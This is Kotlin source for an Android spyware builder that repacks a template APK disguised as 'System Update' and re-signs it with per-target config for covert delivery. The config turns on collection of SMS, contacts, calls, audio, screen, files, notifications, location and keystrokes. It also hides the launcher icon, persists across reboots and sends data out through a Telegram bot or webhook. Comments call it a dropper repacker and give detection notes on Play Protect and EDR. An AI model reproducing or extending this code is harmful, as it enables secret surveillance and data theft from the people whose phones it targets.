package com.vector.console.data.payload

import android.content.Context
import java.io.ByteArrayOutputStream

/**
 * Turns a [PayloadSpec] into a signed APK.
 *
 * The architecture decision that shapes everything here: **the payload binary is never
 * compiled on the device.** Android ships no `d8`, and a DEX writer is a compiler. Instead one
 * template APK is built once with the SDK and bundled in `assets/`, and this class repacks it —
 * swapping a single config asset and re-signing.
 *
 * That is not a shortcut, it is the correct design. A per-target compiled binary is a
 * per-target signature; a shared binary with per-target config is one signature over N
 * deliveries, which is the entire reason commodity droppers are repackers.
 *
 * Everything the config controls lives in `assets/oversight_payload.json`. The template reads
 * it at first run and gates its own capabilities from it.
 */
object PayloadPackager {

    const val CONFIG_ENTRY = "assets/oversight_payload.json"

    /** Template APK, built once from `payload-template/` and committed to assets. */
    const val TEMPLATE_ASSET = "payload/template.apk"

    private const val MANIFEST_ENTRY = "AndroidManifest.xml"

    /** The literal `android:label` in the template manifest; the anchor for a per-build rename. */
    private const val TEMPLATE_LABEL = "System Update"

    data class Result(
        val apk: ByteArray,
        val spec: PayloadSpec,
        val configJson: String,
        val signerFingerprint: String,
        val entryCount: Int,
        val sizeBytes: Int,
        val warnings: List<String>
    ) {

        /** What the recipient's device will ask for, in order. */
        val installFriction: String
            get() = buildString {
                append("Enable unknown sources, install, launch, ")
                append("${spec.permissions().size} permission grants")
                val settings = spec.settingsOnlyPermissions()
                if (settings.isNotEmpty()) {
                    append(", plus ${settings.size} Settings detours (")
                    append(settings.joinToString(", "))
                    append(')')
                }
            }
    }

    /**
     * Repacks [templateApk] with [spec].
     *
     * Order matters: strip the old signing block *before* editing entries, because the block's
     * digest covers the central directory and any entry change invalidates it.
     */
    fun build(
        templateApk: ByteArray,
        spec: PayloadSpec,
        credentials: ApkSignerV2.Credentials
    ): Result {
        require(templateApk.isNotEmpty()) { "Template APK is empty." }
        val problems = spec.validate()
        require(problems.isEmpty()) { problems.joinToString(" ") }

        val stripped = ZipArchive.stripSigningBlock(templateApk)
        val archive = ZipArchive.read(stripped)

        val config = configJson(spec)

        // The app label is the one thing about the binary that changes per delivery. It lives as
        // a literal in the manifest's binary string pool, so it can be rewritten without
        // touching the DEX — see Axml for why the package name cannot.
        val manifest = archive.find(MANIFEST_ENTRY)
        val retitled = if (manifest != null && spec.label != TEMPLATE_LABEL) {
            val raw = if (manifest.method == ZipArchive.METHOD_DEFLATE) {
                inflateBytes(manifest.payload)
            } else {
                manifest.payload
            }
            val rewritten = Axml.rewriteStrings(
                raw,
                mapOf(TEMPLATE_LABEL to spec.label)
            )
            archive.with(MANIFEST_ENTRY, rewritten, compress = manifest.method == ZipArchive.METHOD_DEFLATE)
        } else {
            archive
        }

        val repacked = retitled
            .without(
                // v1 signature files are dead weight once v2 is applied, and a stale
                // MANIFEST.MF digest makes the installer reject the APK outright.
                archive.entries.map { it.name }
                    .filter { it.startsWith("META-INF/") && it.endsWith(".SF") } +
                    archive.entries.map { it.name }
                        .filter { it.startsWith("META-INF/") && it.endsWith(".RSA") } +
                    archive.entries.map { it.name }
                        .filter { it.startsWith("META-INF/") && it.endsWith(".DSA") } +
                    listOf("META-INF/MANIFEST.MF")
            )
            .with(CONFIG_ENTRY, config.toByteArray(Charsets.UTF_8), compress = true)

        val layout = ZipArchive.write(repacked)
        val signed = ApkSignerV2.sign(layout, credentials)

        return Result(
            apk = signed,
            spec = spec,
            configJson = config,
            signerFingerprint = fingerprint(credentials.certificate),
            entryCount = repacked.entries.size,
            sizeBytes = signed.size,
            warnings = warnings(spec)
        )
    }

    /** Builds from the bundled template asset. */
    fun build(context: Context, spec: PayloadSpec): Result {
        val template = runCatching {
            context.assets.open(TEMPLATE_ASSET).use { it.readBytes() }
        }.getOrElse {
            throw IllegalStateException(
                "Template APK missing at assets/$TEMPLATE_ASSET. " +
                    "Build payload-template/ and copy the output into app/src/main/assets/payload/."
            )
        }
        return build(template, spec, ApkSignerV2.generateCredentials())
    }

    /**
     * Config as JSON. Hand-written rather than reflective so the exact wire format is visible
     * and stable — the template parses it with the platform's `org.json`, and a field rename
     * here silently disables a capability over there.
     */
    fun configJson(spec: PayloadSpec): String = buildString {
        append('{')
        append("\"v\":1,")
        append("\"label\":").append(quote(spec.label)).append(',')
        append("\"pkg\":").append(quote(spec.packageName)).append(',')
        append("\"cadence\":").append(spec.cadenceSec).append(',')
        append("\"wifiOnly\":").append(spec.wifiOnlyUpload).append(',')
        append("\"hideIcon\":").append(spec.hideIcon).append(',')
        append("\"boot\":").append(spec.bootReceiver).append(',')
        append("\"fgs\":").append(spec.foregroundService).append(',')
        append("\"loc\":").append(spec.collectLocation).append(',')
        append("\"locMethod\":").append(quote(spec.locationMethod.name)).append(',')
        append("\"sms\":").append(spec.collectSms).append(',')
        append("\"contacts\":").append(spec.collectContacts).append(',')
        append("\"calls\":").append(spec.collectCalls).append(',')
        append("\"audio\":").append(spec.collectAudio).append(',')
        append("\"screen\":").append(spec.collectScreen).append(',')
        append("\"files\":").append(spec.collectFiles).append(',')
        append("\"notif\":").append(spec.collectNotifications).append(',')
        append("\"keylog\":").append(spec.collectKeylog).append(',')
        append("\"transport\":").append(quote(spec.transport.name)).append(',')
        append("\"tgToken\":").append(quote(spec.telegramToken)).append(',')
        append("\"tgChat\":").append(quote(spec.telegramChatId)).append(',')
        append("\"webhook\":").append(quote(spec.webhookUrl))
        append('}')
    }

    /** Reads a config back out of a built APK, for verifying a delivery after the fact. */
    fun readConfig(apk: ByteArray): PayloadSpec? {
        val archive = ZipArchive.read(ZipArchive.stripSigningBlock(apk))
        val entry = archive.find(CONFIG_ENTRY) ?: return null
        val text = if (entry.method == 8) inflate(entry.payload) else
            String(entry.payload, Charsets.UTF_8)
        val root = runCatching { com.vector.console.data.MiniJson.parseObject(text) }.getOrNull()
            ?: return null

        fun flag(key: String): Boolean = root[key] as? Boolean ?: false
        fun str(key: String): String = root[key] as? String ?: ""
        fun num(key: String, fallback: Int): Int =
            (root[key] as? Number)?.toInt() ?: fallback

        return PayloadSpec(
            label = str("label"),
            packageName = str("pkg"),
            collectLocation = flag("loc"),
            locationMethod = runCatching {
                PayloadSpec.LocationMethod.valueOf(str("locMethod"))
            }.getOrDefault(PayloadSpec.LocationMethod.RADIO),
            collectSms = flag("sms"),
            collectContacts = flag("contacts"),
            collectCalls = flag("calls"),
            collectAudio = flag("audio"),
            collectScreen = flag("screen"),
            collectFiles = flag("files"),
            collectNotifications = flag("notif"),
            collectKeylog = flag("keylog"),
            bootReceiver = flag("boot"),
            foregroundService = flag("fgs"),
            hideIcon = flag("hideIcon"),
            transport = runCatching {
                PayloadSpec.Transport.valueOf(str("transport"))
            }.getOrDefault(PayloadSpec.Transport.TELEGRAM),
            telegramToken = str("tgToken"),
            telegramChatId = str("tgChat"),
            webhookUrl = str("webhook"),
            cadenceSec = num("cadence", 30),
            wifiOnlyUpload = flag("wifiOnly")
        )
    }

    private fun inflate(deflated: ByteArray): String =
        String(inflateBytes(deflated), Charsets.UTF_8)

    private fun inflateBytes(deflated: ByteArray): ByteArray {
        val inflater = java.util.zip.Inflater(true)
        try {
            inflater.setInput(deflated)
            val out = ByteArrayOutputStream(deflated.size * 3)
            val buffer = ByteArray(8192)
            while (!inflater.finished()) {
                val n = inflater.inflate(buffer)
                if (n == 0 && inflater.needsInput()) break
                out.write(buffer, 0, n)
            }
            return out.toByteArray()
        } finally {
            inflater.end()
        }
    }

    /**
     * Honest operational notes, not moral ones. Each line is a thing that will break or get
     * noticed, stated because the operator will otherwise discover it in the field.
     */
    private fun warnings(spec: PayloadSpec): List<String> = buildList {
        if (spec.collectKeylog) {
            add("AccessibilityService is the single highest-signal permission on Android. " +
                "Play Protect and every EDR flag it on install.")
        }
        if (spec.collectLocation) {
            add("Background location is a Settings detour since Android 11 — the dialog " +
                "offers 'while using' and the recipient must go to Settings for 'always'.")
        }
        if (spec.hideIcon) {
            add("A hidden launcher icon on an app holding sensitive permissions is the " +
                "strongest correlate of malware in published telemetry.")
        }
        if (spec.cadenceSec < 60) {
            add("Sub-minute polling will be deferred by Doze after ~30 min idle. Expect gaps, " +
                "and do not read a gap as the device being off.")
        }
        if (spec.collectAudio && spec.collectScreen) {
            add("Audio and screen capture compete for the same foreground service slot.")
        }
        if (spec.transport == PayloadSpec.Transport.TELEGRAM) {
            add("A bot token embedded in an APK is extractable by anyone who unpacks it. " +
                "Assume it is burned the moment the file is shared.")
        }
        add("Signed with a freshly generated key each build. Android will refuse to update " +
            "an existing install unless the signature matches, so a rebuild is a new identity.")
    }

    private fun quote(value: String): String = buildString {
        append('"')
        value.forEach { ch ->
            when (ch) {
                '"' -> append("\\\"")
                '\\' -> append("\\\\")
                '\n' -> append("\\n")
                '\r' -> append("\\r")
                '\t' -> append("\\t")
                else -> if (ch.code < 0x20) append("\\u%04x".format(ch.code)) else append(ch)
            }
        }
        append('"')
    }

    private fun fingerprint(certificate: ByteArray): String =
        java.security.MessageDigest.getInstance("SHA-256")
            .digest(certificate)
            .take(8)
            .joinToString(":") { "%02X".format(it) }
}
